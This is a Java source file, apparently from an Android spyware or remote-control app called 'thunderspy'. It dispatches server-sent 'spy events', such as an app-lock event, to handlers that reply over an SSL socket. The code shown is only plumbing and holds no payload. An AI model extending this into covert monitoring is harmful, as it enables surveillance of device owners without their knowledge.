package com.thunderspy.spy.utils.etp;


import android.os.Environment;

import com.thunderspy.spy.utils.ApplicationContextManager;
import com.thunderspy.spy.utils.ThreadPoolManager;
import com.thunderspy.spy.utils.Utils;

import java.io.FileOutputStream;
import java.util.Collections;
import java.util.HashMap;
import java.util.concurrent.ExecutionException;

import javax.net.ssl.SSLSocket;

/**
 * Created by ariyan on 2/14/17.
 */

public final class EventCallbacks {

    private static HashMap<String, EventCallback> callbacks = new HashMap<String, EventCallback>();

    static {

        callbacks.put(EventCodes.SpyEvents.APP_LOCK, new EventCallback() {
            @Override
            public void run(SSLSocket socket, HashMap<String, String> headers, byte[] data) {
                try {
                    Utils.log(headers);
                    Protocol.sendEvent(socket, "SS1", new HashMap<String, String>(), data);
                } catch (Exception exp) {
                    Utils.log(exp.getMessage());
                }
            }
        });

    }

    public static void execute(String eventCode, final SSLSocket socket, final HashMap<String, String> headers, final byte[] data) {
        final EventCallback cb = callbacks.get(eventCode);
        if(cb != null) {
            Runnable runnableCb = new Runnable() {
                @Override
                public void run() {
                    try {
                        cb.run(socket, headers, data);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
            ThreadPoolManager.execute(runnableCb);
        }
    }



}























